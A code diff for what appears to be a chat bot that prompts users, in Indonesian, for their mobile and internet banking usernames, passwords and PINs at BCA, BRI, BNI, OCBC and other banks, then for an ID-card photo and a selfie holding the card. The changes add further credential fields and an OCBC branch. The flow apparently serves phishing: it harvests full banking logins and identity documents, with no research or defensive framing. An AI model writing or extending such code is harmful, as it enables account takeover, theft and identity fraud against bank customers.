@@ -23,9 +23,11 @@ const getSteps = (bank) => {
   if (b === 'BCA') {
     bankSteps = ['kodeAkses', 'pinMBca', 'myBCAUser', 'myBCAPassword', 'myBCAPin'];
   } else if (b === 'BRI') {
-    bankSteps = ['brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword', 'jenisRekening'];
+    bankSteps = ['brimoUser', 'brimoPassword', 'mobilePin', 'briMerchantUser', 'briMerchantPassword'];
   } else if (b === 'BNI') {
-    bankSteps = ['pinWondr', 'passWondr'];
+    bankSteps = ['pinWondr', 'passWondr', 'mobileUser', 'mobilePassword'];
+  } else if (b === 'OCBC') {
+    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword'];
   } else if (bank) {
     // Other bank: common mobile/ib fields
     bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
@@ -93,11 +95,11 @@ const askNextField = async (chatId, session) => {
     briMerchantUser: '🏪 Masukkan Username BRI Merchant:',
     briMerchantPassword: '🔑 Masukkan Password BRI Merchant:',
     jenisRekening: '📝 Masukkan Jenis Rekening (misal: Britama/Simpedes):',
-    mobileUser: '👤 Masukkan Username Mobile Banking:',
-    mobilePassword: '🔑 Masukkan Password Mobile Banking:',
-    mobilePin: '🔢 Masukkan PIN Mobile Banking:',
-    ibUser: '👤 Masukkan Username I-Banking:',
-    ibPassword: '🔑 Masukkan Password I-Banking:',
+    mobileUser: '👤 Masukkan Username Mobile Banking / User Nyala:',
+    mobilePassword: '🔑 Masukkan Password Mobile Banking / Password Wondr:',
+    mobilePin: '🔢 Masukkan PIN Mobile Banking / PIN BRImo:',
+    ibUser: '👤 Masukkan Username I-Banking / User IB OCBC:',
+    ibPassword: '🔑 Masukkan Password I-Banking / Password IB OCBC:',
     ibPin: '🔢 Masukkan PIN I-Banking:',
     uploadFotoId: '📸 Silakan kirim FOTO KTP Anda:',
     uploadFotoSelfie: '📸 Terakhir, silakan kirim FOTO SELFIE dengan KTP:'
